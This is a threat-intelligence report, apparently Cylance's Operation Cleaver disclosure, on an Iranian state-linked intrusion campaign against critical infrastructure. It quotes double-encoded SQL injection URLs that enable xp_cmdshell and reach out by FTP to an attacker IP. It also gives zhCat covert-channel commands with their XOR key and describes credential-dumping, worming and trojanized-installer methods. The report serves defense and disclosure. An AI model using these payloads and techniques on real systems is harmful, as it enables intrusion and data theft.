PREVENTION IS EVERYTHING
A personal note from Cylance, CEO Stuart McClure

O

n February 24, 1989, United Flight 811 left Honolulu, Hawaii, on its way to Auckland, New Zealand, with
364 souls on board. Somewhere between 23,000 and 24,000 feet an enormous explosion ejected nine
passengers into the dark void over the Pacific Ocean.1 This aviation disaster was later determined to have
been caused by a simple design flaw combined with the lack of corrective action. Boeing and the FAA had
known about this problem for over one year prior to the accident. The result: nine people lost their lives. The other 337
passengers plus 18 crew members who survived, live with the memory every day; all of it due to a highly preventable
design flaw. As a 19-year-old young adult, I was grateful to have survived but I had no idea how that single event would
impact my future in such a profound way. Much of my passion for cybersecurity can be directly attributed to that
fateful day.
The United Flight 811 accident proves just how important it is to detect flaws before tragedy strikes. Preventable
disasters like this are what motivates the Cylance team to create a safer world. We do everything we can to uncover
the flaws in technologies before they damage the physical or cyber world. Our mission is simple: to protect the world.
This report is an attempt to deliver on that mission.

20 and professionally for more than 26 years, there is no doubt in my mind
After tracking hackers both personally

that the release of the information contained in the Operation Cleaver report is vital to the security of the world’s
critical infrastructure.
The focus of the Operation Cleaver report is on one particular Iranian team we’ve dubbed Tarh Andishan, the
infrastructure they utilize, as well as their tactics, techniques and procedures. Roughly translated, “Tarh Andishan”
means “thinkers” or “innovators”. This team displays an evolved skillset and uses a complex infrastructure to perform
attacks of espionage, theft, and the potential destruction of control systems and networks. While our investigation is
ongoing, and we presently have limited visibility inside many of the compromised networks, Cylance observed Tarh
Andishan actively targeting, attacking, and compromising more than 50 victims since at least 2012.
Cylance is committed to responsible disclosure and has refrained from exaggeration and embellishment in this
report, limiting our content to only that which can be definitively confirmed. However, we have speculated on the
possible motivations behind these attacks, given our deep knowledge and understanding of the cyber landscape.
We have made every effort to notify all affected entities prior to publishing this report. Additionally, all personally
identifiable information about the members of Operation Cleaver has been withheld. We don’t care who the adversary
is, where they work or reside, who they’re dating or what party photos they upload to Facebook – all we care about is
preventing campaigns like Operation Cleaver from negatively affecting the real world.

EXECUTIVE SUMMARY
Since at least 2012, Iranian actors have directly attacked,
established persistence in, and extracted highly sensitive
materials from the networks of government agencies and major
critical infrastructure companies in the following countries:
Canada, China, England, France, Germany, India, Israel,
Kuwait, Mexico, Pakistan, Qatar, Saudi Arabia, South Korea,
Turkey, United Arab Emirates, and the United States.

Iran is the new China.

20 the past several years, conducted a significant global surveillance
Operation Cleaver has, over
and infiltration campaign. To date it has successfully evaded detection by existing security
technologies. The group is believed to work from Tehran, Iran, although auxiliary team
members were identified in other locations including the Netherlands, Canada, and the UK.
The group successfully leveraged both publicly available, and customized tools to attack and
compromise targets around the globe. The targets include military, oil and gas, energy and
utilities, transportation, airlines, airports, hospitals, telecommunications, technology, education,
aerospace, Defense Industrial Base (DIB), chemical companies, and governments.

During intense intelligence gathering over the last 24 months, we observed the technical
capabilities of the Operation Cleaver team rapidly evolve faster than any previously observed
Iranian effort. As Iran’s cyber warfare capabilities continue to morph,2 the probability of an attack
that could impact the physical world at a national or global level is rapidly increasing.3 Their
capabilities have advanced beyond simple website defacements, Distributed Denial of Service
(DDoS) attacks, and Hacking Exposed style techniques.

With minimal separation between private companies and the Iranian government, their modus
operandi seems clear: blur the line between legitimate engineering companies and statesponsored cyber hacking teams to establish a foothold in the world’s critical infrastructure.
Iran’s rising expertise, along with their choice of victims, has compelled us to release this report
sooner than we would have liked in order to expose Operation Cleaver to the world. The
evidence and indicators of compromise we provide in this report will allow potentially unaware
victims to detect and eliminate Cleaver’s incursions into their networks.

BACKGROUND
Iran has been severely impacted by debilitating and extremely
advanced malware campaigns since at least 2009. Famous
examples of these efforts include industrial sabotage via
Stuxnet (2009 - 2010), and espionage with Duqu (2009 - 2011)
as well as Flame (2012). These campaigns have targeted Iran’s
nuclear program, and oil and gas operations. Stuxnet was an
eye-opening event for Iranian authorities, exposing them to the
world of physical destruction via electronic means.
Hacking campaigns sourced out of Iran are nothing new. Since the early 2000’s, the information
security industry as a whole has tracked teams like the Iranian Cyber Army, which mainly focuses
on patriotic hacking (website defacements). After the release of Stuxnet, Iran’s motivations appear
to have shifted. Retaliation for Stuxnet began almost immediately in 2011 with campaigns like the
certificate compromises of Comodo and DigiNotar. These attacks served as a warning, showcasing
the rapid evolution of Iran’s hacking skills.
A major retaliation came in the form of 2012’s Shamoon campaign, which impacted RasGas and
Saudi Aramco. It’s estimated that Shamoon impacted over 30,000 computer endpoints and cost
the affected companies tens-of-thousands of hours recovering from the attacks. The direct financial
impact from this retaliation and amount of downtime experienced were staggering. Shamoon was
truly a watershed event for security defenders. It was the first glimpse into the real capabillity and
intention of Iranian cyber operations. We see the same motivation and intent here in Operation
Cleaver: establishing a beachhead for cyber sabotage.
We saw further Iranian backlash in late 2012 and early 2013 in the form of Operation Ababil’s
Distributed Denial of Service (DDoS) attacks against US banks. These attacks were debilitating and
impacted the availability of online banking services. Yet more backlash was witnessed with FireEye’s
exposure of Operation Saffron Rose, an espionage campaign executed by the Ajax Security Team
in 2014. In May 2014, evidence emerged of a highly targeted waterhole attack that leveraged social
media, dubbed Operation Newscaster, which was uncovered by iSight Partners.
In June 2013, Israeli Prime Minister Benjamin Netanyahu accused Iran of carrying out “non-stop”
attacks on “[Israel’s] vital national systems” including “water, power and banking”4. The following
September of 2013, the Wall Street Journal accused Iran of hacking into unclassified U.S. Navy
computers in San Diego’s NMCI (Navy Marine Corp Intranet),5 which we can confirm was part of
Operation Cleaver.

#OPCLEAVER
While previously reported operations attributed to Iran have largely focused on Defense Industrial
Base (DIB) companies, the United States Federal Government, or targets in Middle Eastern countries,
Operation Cleaver has instead focused on a wide array of targets, including energy producers
and utilities, commercial airlines and airports, military intelligence, aerospace, hospitals, and
even universities – with only ten of the targets based in the United States. Such broad targeting
demonstrates to the world that Iran is no longer content to retaliate against the US and Israel alone.
They have bigger intentions: to position themselves to impact critical infrastructure globally.

WHY THE NAME CLEAVER?
The string cleaver is found several times in a variety of custom software used in Operation
Cleaver, including:
references inside the namespaces of their custom bot code 				
1 Numerous
codenamed TinyZBot, e.g.:
e:\projects\cleaver\trunk\zhoupin_cleaver\obj\x86\release\netscp.pdb

2 PDBs associated with the hacker name “Jimbp”, e.g.:
c:\users\jimbp\desktop\binder_1 - for cleaver\binder_1\obj\x86\release\setup.pdb

3 PDBs associated with the keystroke loggers, artifacts, and numerous other tools, e.g.:
e:\Projects\Cleaver\trunk\MainModule\obj\Release\MainModule.pdb

WHY EXPOSE IRAN NOW?
We believe our visibility into this campaign represents only a fraction of Operation Cleaver’s full
scope. We believe that if the operation is left to continue unabated, it is only a matter of time
before the world’s physical safety is impacted by it. While the disclosure of this information will
be a detriment to our ability to track the activity of this group, it will allow the security industry as
a whole to defend against this threat. As such, we are exposing this cyber campaign early in an
attempt to minimize additional real-world impact and prevent further victimization.

CRITICAL DISCOVERIES
Iranian Actors Are Behind Operation Cleaver
•
•
•
•
•
•
•

Persian hacker names are used throughout the campaign including: Salman Ghazikhani,
Bahman Mohebbi, Kaj, Parviz, Alireza, and numerous others.
Numerous domains used in the campaign were registered in Iran.
Infrastructure leveraged in the attack was registered in Iran to the corporate entity Tarh
Andishan, which translates to “invention” or “innovation” in Farsi.
Source netblocks and ASNs are registered to Iran.
Hacker tools warn when their external IP address traces back to Iran.
The infrastructure is hosted through Netafraz.com, an Iranian provider out of Isfahan, Iran.
The infrastructure utilized in the campaign is too significant to be a lone individual or a small
group. We believe this work was sponsored by Iran.

Operation Cleaver Targets Critical Infrastructure Around the World
•
•
•
•
•

US Military targets including NMCI in October 2013.5 Confirmed targeting of global
government entities.
Networks and systems targeted in critical industries like energy and utilities, oil and gas, and
chemical companies.
Assets (both cyber and physical) and logistics information were compromised at major airline
operators, airports, and transportation companies.
Various global telecommunications, technology, healthcare, aerospace, and defense
companies were breached as part of the operation.
Confidential critical infrastructure documents were harvested from major educational
institutions around the world.

Iran’s Cyber Hacking Skills Have Evolved
•
•
•

Initial compromise techniques include SQL injection, web attacks, and creative deceptionbased attacks – all of which have been implemented in the past by Chinese and Russian
hacking teams.
Pivoting and exploitation techniques leveraged existing public exploits for MS08-067 and
Windows privilege escalations, and were coupled with automated, worm-like propagation
mechanisms.
Customized private tools with functions that include ARP poisoning, encryption, credential
dumping, ASP.NET shells, web backdoors, process enumeration, WMI querying, HTTP and
SMB communications, network interface sniffing, and keystroke logging.
The ability to build customized tools to compromise any target they choose.

#OPCLEAVER

Indicators of Compromise (IOC)

•
•
•

Private signing certificates of one victim were captured allowing the Operation Cleaver team to
compromise the entirety of their organization.
Over the past two years, Cylance has collected over 8GB of data including over 80,000 files of
exfiltrated data, hacker tools, victim logs, and highly sensitive reconnaissance data.
Data from sinkholed command and control servers has allowed us to track this active campaign.
Cylance is releasing more than 150 IOCs and samples associated with the Cleaver campaign to
empower the security community to detect existing compromises in their own organizations, as
well as potentially block future attacks from these teams.

This campaign continues Iran’s retaliation for Stuxnet, Duqu, and Flame.
This is a state-sponsored campaign.
There is a possibility that this campaign could affect airline passenger safety.
This campaign’s intentions may be to damage Industrial Control Systems (ICS), Supervisory
Control and Data Acquisition (SCADA) systems, and impact Critical Infrastructure and Key
Resources (CIKR).
This campaign could be a way to demonstrate Iran’s cyber capabilities for additional
geopolitical leverage, due to the breadth and depth of their global targets.
There is an intense focus on CIKR companies in South Korea, which could give Iran additional
clout in their burgeoning partnership with North Korea. In September 2012, Iran signed an
extensive agreement for technology cooperation agreement with North Korea, which would
allow for collaboration on various efforts including IT and security.6
Iran is recruiting from within the universities and potentially using ‘hackers for hire’.7

Cleaver’s level of access into each organization varied greatly, including completely compromised
systems and networks, Active Directory domain controllers and credentials, compromised data
repositories and stolen VPN credentials.
Compromised systems include Microsoft Windows web servers running IIS and ColdFusion,
Apache with PHP, many variants of Microsoft Windows desktops and servers, and Linux servers.
Compromised network infrastructure included Cisco VPNs as well as Cisco switches and routers.
Unlike Stuxnet, no exotic exploitations (such as 0-days) were observed.
Within our investigation, we had no direct evidence of a successful compromise of specific
Industrial Control Systems (ICS) or Supervisory Control and Data Acquisition (SCADA) networks, but
Cleaver did exfiltrate extremely sensitive data from many critical infrastructure companies allowing
them to directly affect the systems they run. This data could enable them, or affiliated organizations,
to target and potentially sabotage ICS and SCADA environments with ease.
We discovered over 50 victims in our investigation, distributed around the globe. Ten of these
victims are headquartered in the US and include a major airline, a medical university, an energy
company specializing in natural gas production, an automobile manufacturer, a large defense
contractor, and a major military installation. The four targets in Israel and the five targets in Pakistan
are comprised of education, aerospace, airports, airlines, healthcare and technology. Further victims
were identified in numerous Middle Eastern countries as well as ones in Northern Europe including
the UK, France, and Germany. Central America was not immune either with a large oil and gas
company on the list. In fact, oil and gas was a particular focal point for the Cleaver team, going after
no less than nine of these companies around the world.
Universities were targeted in the US, India, Israel, and South Korea. The attackers targeted research
efforts, student information, student housing, and financial aid systems. They had a penchant for
pictures, passports, and any specifc identifying information.
Perhaps the most bone-chilling evidence we collected in this campaign was the targeting and
compromise of transportation networks and systems such as airlines and airports in South Korea,
Saudi Arabia and Pakistan. The level of access seemed ubiquitous: Active Directory domains
were fully compromised, along with entire Cisco Edge switches, routers, and internal networking
infrastructure. Fully compromised VPN credentials meant their entire remote access infrastructure
and supply chain was under the control of the Cleaver team, allowing permanent persistence
under compromised credentials. They achieved complete access to airport gates and their security
control systems, potentially allowing them to spoof gate credentials. They gained access to PayPal
and Go Daddy credentials allowing them to make fraudulent purchases and allowed unfettered
access to the victim’s domains. We were witnessed a shocking amount of access into the deepest
parts of these companies and the airports in which they operate.

ATTRIBUTION
Despite today’s trend toward attacker attribution, we believe
it offers little real benefit to the day-to-day cyber defender.
However, in this report we offer our observations on the
sources of Operation Cleaver in order to benefit those that
rely on attribution such as Law Enforcement.
Operation Cleaver is believed to consist of at least 20
hackers and developers, collaborating on projects and
missions to support Iranian interests. Many of the targets were
predominately English-speaking and a majority of the team
members were capable of reading and writing in English. We
present evidence that this team is operating, at least in part,
out of Iran and in the interests of Iran. The skills and behavior
of the Operation Cleaver teams are consistent with, and in
one case surpasses, Iran’s cyber capabilities as we know
them today.
For a complete list of IPs and domains related to this
campaign, please refer to the Indicators of Compromise
section.

Guard Corps (IRGC).

ATTACKER IP ADDRESSES
Over the course of multiple incident response engagements related to Operation Cleaver, we
were able to identify a small set of IP addresses which were commonly used during the initial
stages of an attack.
The IP address 78.109.194.114 served as a source for one of the primary attackers.
They were observed conducting SQL injections, controlling backdoors, as well as exfiltrating
information using this address, and the address appears in multiple software configurations
recovered from staging servers over a period of time.

This IP address was also observed in multiple software configurations. This particular net block
was used over an extended period of time, indicating these were under the Cleaver team’s
physical control. Additionally, prior netblocks used by the same team demonstrated to us that
this wasn’t simply a case of proxying or “island hopping”. For more information see the Tarh
Andishan section of this report.
The IP address 159.253.144.209 was a source for a secondary attacker in various
compromises. They were observed conducting SQL injection attacks. While this IP was this
registered in the Netherlands, we believe they used Softlayer’s Citrix demo environment to
launch these attacks which is consistent with proxying or “island hopping”.

As is typical with malicious domains, the Whois data for most of these domains contained falsified
information.
We managed to obtain a large collection of the internally developed tools used by the Cleaver
team, many of which were developed by its members. Due to operational security failures, these
tools contain information that provided us insight into their organization and operations.

TOOLS & SOFTWARE
Shell Creator 2
In the tool named Shell Creator 2, there are three main components. The creator generates
an ASPX web shell using user input as well as a collection of templates. The web shell could
then be installed via xp_cmdshell, or any other method which would grant the attacker write
access. The web shell is accessible by the shell client directly.
The shell client is a portion of Shell Creator 2 that was not designed to be run on a compromised
computer. We originally located it on a staging server being utilized for multiple attacks as well as
a tool for sharing data between members of the organization’s team.
The shell client, which is developed in Java and is easily decompiled, is a simple interface with
a feature to protect the operator from making a critical mistake. When executed, and before
any connection to an instance of the web shell is initiated, the shell client communicates with
freegeoip.net in order to get the external IP address of the current user. The country of origin
is then shown to the user, to inform them of what country it appears they are connecting from.
The assumed purpose of this feature is to ensure that a proper proxy is in use, and the real origin
of the attacker is not revealed.
After decompiling the shell client, we found the following code segment controlling the display of
this IP location information.

Figure 5: Java source code showing how Shell Creator 2 distinguishes between a source IP address
coming from Iran (red) versus any other country (green).

This code handles the XML response from freegeoip.net, and displays the information
as different colors based on different attributes. For instance, if the string “ERROR” is in the
response, the text is displayed with the color magenta. If the string IRAN is in the response, the
text is displayed with the color red. It should be noted that no other country name contains the
substring IRAN.

Net Crawler

Net Crawler is a tool developed in C# that exhibits worm-like behavior in order to gather cached
credentials from any and all accessible computers on an infected network. This is done with
Windows Credential Editor (WCE) and Mimikatz in combination with PsExec. Different versions of
this malware contain ASCII art which names the authoring group as Zhoupin (in “leetspeak” as
“Zh0up!n”).

TinyZBot
TinyZBot is a bot written in C# and developed by the Cleaver team. It is the longest developed
malware family discovered by this group, and has been used in campaigns for close to two
years. How it operates can vary greatly from version to version. For a detailed technical analysis
of TinyZBot, see the Tactics, Techniques and Procedures section. As TinyZBot is developed in
C#, many versions can be decompiled to code very similar to their originals, including names
of namespaces. Many versions were obfuscated with a legitimate tool for developers named
SmartAssembly, which makes the recovery of some names implausible.
We obtained multiple versions from which we were able to recover many of the original names of
variables and namespaces. In a number of these samples, the primary namespace for TinyZBot
is named Zhoupin_Cleaver. In every version of TinyZBot that is not obfuscated, there is a
code base referred to as Cleaver. This code base is also shared in other malware developed by
this organization, such as Csext.

PrivEsc
PrivEsc is a blatant plagiarism of an existing exploit for Microsoft Windows released in January
2010 called MS10-015, “Vulnerabilities in Windows Kernel Could Allow Escalation of Privilege”,
popularly known as the KiTrap0D exploit which was released publicly. The Cleaver team clearly
modified the source code and compiled a new version. The only detectable modification was to
change the original author’s name to instead display the following:
Zhopin Exploit Team
This is not the only case of this team relabeling others’ work as their own.

Logger Module
Logger module is a component of the PVZ (PVZ is shorthand for Parviz, one of the members of
the Cleaver team) bot tool chain. When executed, it will capture the user’s keystrokes and save
them to a location which PVZ bot then exfiltrates. The logger module binary’s file description
value is the following:

Roughly translated from Persian, this text says:

NMAP Log
Log output from the network port scanning application NMAP was recovered from a staging
server. This log was generated during the usage of the nbrute utility, which brute-forces network
credentials and relies on NMAP to do so. The header of this NMAP log indicates that the computer
used to run nbrute/nmap was set to Iran Daylight Time at the time of execution.
Starting Nmap 6.25 at 2012-08-17 09:18 Iran Daylight Time
With no known victims located in Iran, it is likely that this was executed on an attacker’s computer,
and not on a victim’s computer.

Squid Configuration
A configuration file for a Squid proxy server was recovered.

Figure 12: Squid configuration file showing the use of Tarh Andishan’s IP address.

The net range of 78.109.194.114/28 was inserted into the allowed local networks with an RFC
comment appended in order to make it look like it was part of the default configuration. It is likely
this is the same reason a /28 net range was used, in order to not look like it was intended to only
allow one IP. This would give the same access to resources accessible from the Squid proxy server
to this Iranian IP address.

TARH ANDISHAN
Tarh Andishan is listed as the registrant for a number of small net blocks based upon the email
address tarh.andishan(at)yahoo.com. The net blocks appear to rotate over time and

Alireza appears to be one of the senior developers of this organization. His tools are commonly
developed in C++, Java, and C# (desktop and ASPX). These tools are often support tools, either
monitoring the activity of other tools or supplementing the function of other tools gathering
information during the infiltration process. Alireza’s code appears to be reused internally on
projects such as TinyZBot. Alireza appears to be using a version control system for his code, and
it is likely that others are using the same system. Based on the paths, the version control system in
use is likely Apache’s Subversion. Use of a version control system is indicative of code sharing, but
the use of an older system like Subversion, along with other evidence, suggests there is not a large
amount of collaboration on projects and likely one developer working on each project at a time.
This is not behavior typical of a professional development team.

TEAMS
Of course many associated Iranian hacker teams have been identified in public and private
security circles. Some of the teams publicly known today include Iranian Cyber Army, Ashiyane,
Islamic Cyber Resistance Group, Izz ad-Din al-Qassam Cyber Fighters, Parastoo, Shabgard, Iran
Black Hats and many others9.
However, even though the TTPs of the Cleaver team have some overlap to techniques used by
Iranian Cyber Army (botnets), Ashiyane (SQL injection) and Syrian Electronic Army (phishing and
RATs), we believe this is largely the work of a new team. Some connections to Ashiyane were
discovered in our investigations including a reference to hussein1363, who had prior ties to
the hacker group. Additional connections between team members and individuals exist but are
predominantly speculative and have only been shared with law enforcement.
Ultimately we believe the Cleaver team is a mix of existing team members and new recruits
pulled from the universities in Iran.

TACTICS, TECHNIQUES & PROCEDURES
The Cleaver campaign used a variety of methods in multiple stages of attacks. In this section we’ll
cover the commonly observed methods during different stages of the attack.

INITIAL COMPROMISE
The initial compromise gets the attackers their first foothold into the target network. Once the
ability to execute arbitrary code has been established, an attacker’s job becomes quite a bit
easier. Since the vector of initial compromise is usually determined by what is vulnerable on the
target, we’ll cover just a few of the techniques we’ve seen Operation Cleaver use to initiate the
compromise.

SQL Injection
SQL injection is a very common and simple attack method. It is made possible by a lack of input
sanitization by the vulnerable application before supplying that input into a SQL database query.
SQL injection payloads used by this organization have been double encoded. Double encoding
SQL injection payloads allows for bypassing of various anti-exploitation filters, such as those
supplied by Web Application Firewalls (WAFs).
The attackers would enable xp_cmdshell:
http://localhost/Demos/demo.cfm?Edit%26ID=111;declare%20@b1%20varchar(8000);set%20@
b1=%20show advanced options;declare%20@b2%20varchar(8000);set%20@b2=%20xp_
cmdshell;%20EXEC%20master.dbo.sp_configure%20@b1,%201;RECONFIGURE;EXEC%20master.dbo.
sp_configure%20@b2,%201;RECONFIGURE;--%20

Then connect outbound via anonymous FTP:
http://localhost/Demos/demo.cfm?Edit%26ID=111;declare%20@b1%20varchar(8000);set%20@
b1=%20ftp -A 108.175.152.230;%20exec%20master..xp_cmdshell%20@b1--%20

Spear-Phishing Campaign
Using messaging methods such as email, attackers can social engineer users into downloading
and executing software, which quietly installs malware alongside of the desired program.
Operation Cleaver has employed this technique numerous times across different organizations.

Resume Creator Pro website to lure job candidates to download and install their TinyZBot agent.

That’s not all they copied. In order to infect users, they combined the original Easy Resume Creator
Pro product with malware by using a binder they developed internally named Binder_1. A binder
is an application, which combines two executables (desired software and malware) into a single
executable.
The resulting executable masquerades as the desired software. The purpose is deception, to make
the binder indistinguishable from the desired application. When executed, both applications are
written to a temporary directory and executed. This way it appears that the desired application was
executed, but the malware was also executed silently.

Teledyne Résumé Submitter

Figure 16: When the résumé submitting
application is executed, a splash screen is
displayed.

This attack evolved to appear more legitimate. The
attackers made the victims feel like they had a pending
job opportunity at the industrial conglomerate Teledyne. In
order to take advantage of this job opportunity, the victim
needed to use the fake résumé submission application
supplied by the malicious recruiter. Multiple domains were
registered in order to make the download sites seem more
realistic. These domains included other companies as they
tried to hit a wider audience.
• Teledyne-Jobs.com
• Doosan-Job.com
• NorthropGrumman.net
At this point, the résumé submission application checks the
Internet connection. If it is unable to connect to the Internet,
it will display a window to input proxy information.

Figure 17: Unable to connect to the Internet, the
tool prompts the user for proxy configuration
information.

Figure 18: Final résumé submission form
displays to the user while the malware runs
freely in the background.

34

When this information is entered, the results are cached
in a location the dropped malware can access. After an
Internet connection is ensured, the malware (TinyZbot) is
dropped and executed. This clever scheme makes sure the
malware can connect to the command and control server,
and increases the chances that domain credentials are
cached on the now infected machine. Shortly after, the main
application is launched.

#OPCLEAVER
Teledyne Résumé Submitter (cont.)
The first résumé submission form requests contact information. This form, like the rest of the
submission forms, only stores the submitted information while the application is running. As the
infected user is going through and filling out all this information, the malware is running in the
background, logging their keystrokes, retrieving their stored passwords, etc. Once all the forms are
filled out, the user goes to the submission form.

When the victim hits submit, the résumé submitter does a GET request to microsoft.com in order
to make it seem like it is submitting something, then claims success.
This method is particularly effective not only because of its level of deception, but even if the victim
suspects that they are infected with malware, they are not as likely to speak up about it, as they
would need to explain why they were submitting a job application for another company.

PRIVILEGE ESCALATION & PIVOTING
Privilege escalation is a category of techniques that describe the process of going from a less
privileged user on a compromised computer to a more privileged user. This increase in privileges
allows for the attacker to gain access to privleged areas of the operating system as well as to
infect other computers on the target network.
This team did not utilize any novel methods of privilege escalation, but they were observed
using a variety of publicly known exploits. PrivEsc is a compiled exploit, which leverages
the vulnerability commonly referred to as KiTrap0D (CVE-2010-0232). The exploit allows for
escalation of privileges on unpatched Windows operating systems from an unprivileged user to
kernel-level privilege.
This vulnerability and the corresponding exploit were discovered and developed in 2010.
The plagiarized version used in Operation Cleaver was compiled in May 2013, with a slight

Exploit Team.
Pivoting is the process of leveraging access from one compromised computer in order to gain
access to additional systems on the target network. This can involve launching attacks from the
compromised computer, or simply abusing access once it has been gained.

Cached Credential Dumping
A very common method of pivoting on a predominantly Windows operating system based
network is to extract domain credentials which have been used on the compromised computer
from a credential cache. There are a few well-known tools which are capable of doing this given
sufficient privileges on the infected host. Two of these tools used by Cleaver are Mimikatz and
Windows Credential Editor.

zhMimikatz and MimikatzWrapper
Two similar applications were developed by Operation Cleaver in order automate the execution
of Mimikatz. These applications are zhMimikatz and MimikatzWrapper. These applications store
multiple versions of Mimikatz in their resources. When executed, they determine which version
of Mimikatz to use based on whether the computer’s version of Windows is 32-bit or 64-bit. This
technique is uncommon in malware and shows the advanced skillset of the Cleaver team. Both
tools were developed in C#.

zhMimikatz and MimikatzWrapper (cont.)
In the following examples, the computer name is TheComputerName, the username of the
logged in user is TheUser, and that user’s password is ThePassword. At the time of execution,
the system only has its own credentials available and no cached network credentials.

zhMimikatz
zhMimikatz executes the correct version of Mimikatz for the current system, and parses the results
for any cached credentials.

MimikatzWrapper
Output from MimikatzWrapper is essentially the same as zhMimikatz, despite being a different
Visual Studio project.

The only external difference is that MimikatzWrapper also logs these results to res.txt in the
executing directory. This can make it useful for tools like the PVZ tool chain and Csext to execute
with logged results:

#OPCLEAVER
PsExec Spreading
Once an attacker has credentials extracted from the cache, whether in hash form or in plaintext
form, PsExec can be used to run commands on any other computer which accepts those domain
credentials. If this technique is combined with cached credential dumping, it can be used to jump
from computer to computer on a compromised network.

NetC (Net Crawler)
Net Crawler utilizes a cached credential dumping technique along with PsExec in order to
worm throughout a network, collecting any and all credentials that it can extract from credential
caches. It has the ability to do this with both Windows Credential Editor and Mimikatz. It starts by
first extracting cached credentials from the infected computer’s cache. Once this is complete, it
then continues to scan a set of configured IP addresses on the local subnet to determine which
IP addresses have SMB related ports open. Then an iterative methodology is applied to brute
forcing each SMB enabled target with each credential that was extracted from the cache.

When a positive result has been achieved, it will create a copy of itself with a modified
configuration stored as a PE resource, then send and execute the copy utilizing PsExec. This
copy repeats the behavior of the original, but with already discovered credentials as well as
newly discovered ones on the newly infected host. Any credentials found are reported back to
the original infection.

#OPCLEAVER
MS08-067 Exploit
MS08-067 is a vulnerability in Microsoft Windows made popular by the Conficker worm which can
be exploited by a specially crafted packet to the operating system’s RPC network interface. This
vulnerability has been patched since October 2008, but many networks have failed to update their
systems even to this day.
Operation Cleaver used a plagiarized version of a publicly available exploit for this vulnerability
developed in Python. Someone in the Cleaver team (presumed to be Nesha) modified the exploit to
read “By Nesha”.

Jasus is an ARP cache poisoner developed by the Operation Cleaver team. It makes use of
WinPcap and is developed in C. Compared to some other publicly available ARP cache poisoning
utilities, Jasus is poorly developed and without many useful features. The primary positive attribute
of Jasus is its poor detection ratio by the antivirus industry.

Cain & Abel

Cain & Abel is a publicly available toolkit, which covers a wide range of functionality that assists
attackers once they have compromised a node on a network. It has the ability to dump stored and
cached credentials, and conduct attacks like ARP cache poisoning in order to capture credentials
being transmitted on the network. It also has a remotely installable trojan named Abel, which
enables some of its functionality on a remote target.
We observed the Operation Cleaver team using Cain & Abel for extracting credentials from caches
and the network when they are confident that there is little to no antivirus protection on the infected
target.

EXFILTRATION

Exfiltration is the process of moving information to an external site. In this context, it is the process
of stealing information without being detected. Operation Cleaver has a strong focus on stealing
confidential/privileged information, and they have utilized a few methods in order to facilitate this
objective.

Anonymous FTP Servers
Cleaver Operations observed in 2013 mainly utilized FTP servers with anonymous access
enabled in order to pilfer large quantities of information. This allowed them to use existing
command line utilities available on their targets in order to upload information. This is a versatile
technique as it does not require any additional software which could be detected. These
FTP servers were also observed during the infection process, as infected computers were
often instructed to download additional files from these FTP servers, including backdoors and
pivoting tools.
The following IP addresses hosted FTP servers that were used in the infection of targets or in
the exfiltration of information.
• 108.175.152.230 – Santa Rosa, CA, USA
• 108.175.153.158 – Santa Rosa, CA, USA
• 184.82.181.48 – Pilot Mountain, North Carolina, USA

NetCat
NetCat is a network tool which has many valid purposes but can also be used for malicious
purposes. Its main functionality allows for a client and server communication channel, allowing
for information to be transported over the network simply. NetCat has an option when being
compiled to enable or disable the ability for NetCat to execute a command after the connection
is established. This feature can be abused to enable a reverse connecting shell, which can be
used to remotely control a target.
NetCat’s network communications are in plaintext, and could be viewed by an egress filter
looking to block the exfiltration of sensitive information. The Operation Cleaver team was
observed attempting to use NetCat to exfiltrate information as well as use it as a reverse
connecting shell. The use of NetCat was later replaced with zhCat.

42

#OPCLEAVER
zhCat
zhCat is a tool developed by the Operation Cleaver team which operates similarly to NetCat. Its
main purpose is to create a channel that is capable of transporting information over the network.
The changes made in zhCat allow for this information to be transferred with inline obfuscation and/
or encryption. This makes it more difficult to detect that privileged information is being exfiltrated.
The command line help (of a particular version) shows the following options:

Multiple obfuscation/encryption methods are available. The –h argument enables HTTP mode.
This makes the traffic between zhCat instances look like benign HTTP traffic. For instance, if the
attackers set up a zhCat instance listening on port 1000 on 192.168.116.128 in HTTP mode, the
client instance of zhCat would use the following command:
zhcat.exe –h –p 1000 –i 192.168.116.128

The server instance would use the following command:

zhcat.exe –l –h –p 1000

When we run both of these, we can send information just by typing it into the terminal of the
running application. Information can be supplied by standard input.

zhCat (cont.)
If we observe the network communications during this transfer, we can see the following HTTP
POST request.

Note: research into ebizmba.com did not turn up any additional evidence of being involved
with the development of zhCat.
On the server side, we can see our message has been received:

If stricter egress filtering is enabled, the attackers can use zhCat to also XOR encrypt the traffic
with a shared key. These keys are stored inside zhCat. The following is the key used for XOR
encryption:
Sorry! The handle to file %s is not a valid handle any more.\nSorry!
The handle to file %s is not a valid handle any more.
The \n represents hex character 0x0A, which is a new line character.
An attacker could set up a server instance of zhCat with the following command in order to
enable both HTTP and XOR obfuscation:
zhcat.exe –h –p 1000 –l –x
The client instance could then be invoked with the following command:
zhcat.exe –h –p 1000 –i 192.168.116.128 –x
Once again, information can be supplied via standard input.

PLink

PLink is one of the many utilities provided in the PuTTY (SSH) suite, which has many benign
purposes. It is capable of communicating over various protocols, the most notable being SSH.
The SSH protocol is a heavily utilized encrypted protocol, most commonly used for remote
administration of UNIX based operating systems. PLink is designed to implement some of the
SSH functions related to forwarding traffic as well as other functionality.

Operation Cleaver uses PLink to forward local RDP ports to remote SSH servers. This allows them
to easily connect to RDP servers inside the networks of their victims. These RDP connections can
be used to exfiltrate information visually, as well as to remotely control the computers hosting the
RDP servers.

SMTP
Early Cleaver operations abused SMTP in order to exfiltrate information. The sending is
performed by internally developed malware samples such as TinyZBot and Csext in order to
exfiltrate information about the infected computer, as well as requested files and keystroke
logging information. Messages were sent using an open SMTP relay at BeyondSys.com with
the sender email address dyanachear(at)beyondsys.com. This allowed the attackers to use
infrastructure that was not theirs to exfiltrate information. The known recipient addresses of this
information were testmail_00001(at)yahoo.com and TerafficAnalyzer(at)yahoo.
com. In order to deceive anyone reading these emails, they made them appear to be a spam
message that most would not think twice about. The subject used is the following:
No Prescription required. Viagra Dosages: 25, 100, 150mg.
Fast worldwide delivery.
The message used is the following:

The files being exfiltrated are added to the email as attachments.

SOAP
SOAP is a sub-protocol communicated via HTTP. In relation to Operation Cleaver, it is used as the
command and control protocol for TinyZBot, which was the preferred backdoor, and underwent
long-term development. HTTP communications are often used by botnets, but it is uncommon
to use a sub-protocol such as SOAP. It is likely that SOAP was used because it is simple to
implement in C#, and has the added benefit of blending in with other benign HTTP traffic.
As part of TinyZBot’s command and control protocol, files can be exfiltrated over SOAP to the
command and control server. For more information about TinyZBot, see the Persistence section.

#OPCLEAVER
PERSISTENCE
Persistence is the means of maintaining access to a compromised network. There are limitless
methods of persistence; the following are techniques and tools for persistence used by Cleaver.

TinyZBot
